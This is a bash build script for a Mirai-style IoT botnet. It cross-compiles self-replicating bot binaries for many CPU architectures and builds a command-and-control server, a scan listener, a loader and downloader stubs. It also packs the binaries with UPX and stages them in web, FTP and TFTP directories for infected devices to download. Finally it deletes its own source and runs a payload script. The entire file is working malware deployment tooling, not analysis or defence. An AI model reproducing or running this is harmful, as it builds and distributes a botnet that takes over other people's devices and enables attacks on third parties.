#!/bin/bash
set -e
cd /root/B0BNET
echo "Export bin"

if [ ! -d /etc/xcompile/i586 ]; then
    echo "ERROR: Cross-compilers not found in /etc/xcompile."
    echo "Run the cross-compiler install steps from INSTALL_UBUNTU.txt first."
    exit 1
fi
export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export GOROOT=/usr/local/go; export PATH=$GOROOT/bin:$PATH; go mod tidy

# Compile Setting
function compile_bot {
    "$1-gcc" -std=c99 $3 /root/B0BNET/bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o /root/B0BNET/release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" /root/B0BNET/release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function compile_bot_arm7 {
    "$1-gcc" -std=c99 $3 /root/B0BNET/bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o /root/B0BNET/release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

function arc_compile {
    "$1-linux-gcc" -std=c99 $3 /root/B0BNET/bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o /root/B0BNET/release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" /root/B0BNET/release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}


rm -rf /root/B0BNET/release
mkdir -p /root/B0BNET/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/hiddenbin
go build -o /root/B0BNET/condi_cnc /root/B0BNET/cnc/
go build -o /root/B0BNET/loader/scanListen /root/B0BNET/scanListen.go

echo "Building - x86"
compile_bot i586 boatnet.x86 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - mips"
compile_bot mips boatnet.mips "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - mipsel"
compile_bot mipsel boatnet.mpsl "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - armv4l"
compile_bot armv4l boatnet.arm "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - armv5l"
compile_bot armv5l boatnet.arm5 "-DKILLER -DSELFREP -DWATCHDOG"
echo "Building - armv6l"
compile_bot armv6l boatnet.arm6 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - armv7l"
compile_bot_arm7 armv7l boatnet.arm7 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - powerpc"
compile_bot powerpc boatnet.ppc "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - sparc"
compile_bot sparc boatnet.spc "-static -DKILLER -DSELFREP -DWATCHDOG" || echo "WARNING: sparc build failed, skipping"
echo "Building - m68k"
compile_bot m68k boatnet.m68k "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - sh4"
compile_bot sh4 boatnet.sh4 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo "Building - arc"
arc_compile arc boatnet.arc "-static -DKILLER -DSELFREP -DWATCHDOG"

if [ ! -f /root/B0BNET/release/boatnet.x86 ]; then
    echo "ERROR: Bot binaries were not created. Check cross-compiler installation."
    exit 1
fi

cp /root/B0BNET/release/boatnet.* /var/www/html/hiddenbin
cp /root/B0BNET/release/boatnet.* /var/ftp
mv /root/B0BNET/release/boatnet.* /var/lib/tftpboot
rm -rf /root/B0BNET/release

echo "Building loader"
gcc -static -O3 -lpthread -pthread /root/B0BNET/loader/src/*.c -o /root/B0BNET/loader/loader

mkdir -p /root/B0BNET/dlr/release

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/B0BNET/dlr/main.c -o /root/B0BNET/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/B0BNET/dlr/main.c -o /root/B0BNET/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/B0BNET/dlr/main.c -o /root/B0BNET/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/B0BNET/dlr/main.c -o /root/B0BNET/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/B0BNET/dlr/main.c -o /root/B0BNET/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/B0BNET/dlr/main.c -o /root/B0BNET/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/B0BNET/dlr/main.c -o /root/B0BNET/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/B0BNET/dlr/main.c -o /root/B0BNET/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/B0BNET/dlr/main.c -o /root/B0BNET/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/B0BNET/dlr/main.c -o /root/B0BNET/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static /root/B0BNET/dlr/main.c -o /root/B0BNET/dlr/release/dlr.spc

armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/B0BNET/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/B0BNET/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/B0BNET/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/B0BNET/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/B0BNET/dlr/release/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/B0BNET/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/B0BNET/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/B0BNET/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/B0BNET/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/B0BNET/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr /root/B0BNET/dlr/release/dlr.spc

mv /root/B0BNET/dlr/release/dlr* /root/B0BNET/loader/bins
rm -rf /root/B0BNET/dlr /root/B0BNET/loader/src /root/B0BNET/bot /root/B0BNET/scanListen.go /root/B0BNET/build.sh

cd /tmp
wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf /tmp/upx-3.94-i386_linux.tar.xz
mv /tmp/upx-3.94-i386_linux/upx /root/B0BNET/upx
/root/B0BNET/upx --ultra-brute /var/www/html/hiddenbin/*
/root/B0BNET/upx --ultra-brute /var/lib/tftpboot/*
/root/B0BNET/upx --ultra-brute /var/ftp/*
rm -rf /tmp/upx-3.94-i386_linux.tar.xz /root/B0BNET/upx
python3 /root/B0BNET/payload.py
rm -f /root/B0BNET/payload.py
